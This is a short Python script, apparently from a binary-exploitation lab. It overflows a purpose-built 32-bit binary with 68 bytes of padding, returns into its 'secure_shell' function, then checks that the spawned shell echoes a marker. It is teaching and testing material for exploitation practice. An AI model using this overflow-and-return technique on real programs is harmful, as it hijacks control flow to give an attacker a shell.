from common import BUILD, execute, p32, plt, print_result, symbols

binary = BUILD / "ret2text32"
sym = symbols(binary)
payload = b"A" * 68 + p32(sym["secure_shell"])
print(f"[ret2text] offset=68, secure_shell=0x{sym['secure_shell']:08x}")
status, output = execute(binary, [payload], b"echo RET2TEXT_OK\nexit\n")
print_result("ret2text", status, output, "RET2TEXT_OK")
